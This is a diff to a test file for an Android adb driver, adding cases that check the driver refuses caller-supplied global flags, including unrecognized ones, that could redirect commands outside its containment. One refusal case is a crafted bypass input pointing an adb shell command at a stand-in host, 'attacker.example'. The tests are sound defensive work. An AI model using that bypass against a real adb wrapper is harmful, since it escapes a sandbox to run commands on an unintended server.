@@ -1800,7 +1800,7 @@ describe("AndroidDriver.create", () => {
     );
   });
 
-  it("refuses a caller-supplied server flag in the globals, in every spelling adb accepts", async () => {
+  it("refuses a caller-supplied server flag in the globals, in every spelling adb accepts, and any global it does not recognize", async () => {
     // `adb` takes the *last* `-P` on the line, so a caller-supplied one silently wins over the
     // one this driver inserts and the command lands on whatever server that names -- the
     // machine's default one included, which is outside Simlock's containment entirely (safety
@@ -1821,6 +1821,21 @@ describe("AndroidDriver.create", () => {
       ["-Hother-host", "devices"],
       ["-L", "tcp:127.0.0.1:5037", "devices"],
       ["-s", "emulator-5554", "-P5037", "shell", "getprop"],
+      // `--reply-fd` is a real, value-taking adb global absent from `adb --help` (confirmed
+      // against the adb binary: it errors `--reply-fd requires an argument`, not `unknown
+      // command`). A scanner that assumes an unrecognized flag takes no value reads its value
+      // (`9`) as the subcommand and never notices the `-H`/`-P` that follow -- the exact
+      // bypass this allow-list scan closes by refusing anything it does not recognize.
+      ["--reply-fd", "9", "-H", "attacker.example", "-P", "5037", "shell", "id"],
+      // Other real adb globals this driver has no reason to allow through, none of which may
+      // silently terminate the scan either: an unrecognized flag is refused on sight, not
+      // treated as ending the globals region.
+      ["-a", "devices"],
+      ["--exit-on-write-error", "devices"],
+      ["--one-device", "usb:1", "devices"],
+      // A wholly invented flag stands in for "the next adb release adds one": this list must
+      // refuse what it has never seen, not just what it already knows to refuse.
+      ["--not-a-real-adb-flag", "devices"],
     ]) {
       expect(() => driver.passthrough(args), args.join(" ")).toThrow(PassthroughRefusedError);
       expect(() => driver.passthrough(args, { hasTerminal: false }), args.join(" ")).toThrow(
@@ -1835,7 +1850,15 @@ describe("AndroidDriver.create", () => {
       ["shell", "echo", "-Please"],
       ["shell", "getprop", "-P5037"],
       ["-s", "emulator-5554", "devices"],
+      // `-t` is allowed in both spellings adb accepts: separate, and fused like `-P`/`-H`.
+      ["-t", "1", "devices"],
+      ["-t1", "devices"],
+      ["-d", "devices"],
+      ["-e", "devices"],
+      // `--version` and `--help` answer on their own before adb ever looks for a subcommand,
+      // so this scan treats them as the subcommand rather than as a global with an arity.
       ["--version"],
+      ["--help"],
     ]) {
       expect(driver.passthrough(args).args, args.join(" ")).toEqual([
         "-P",
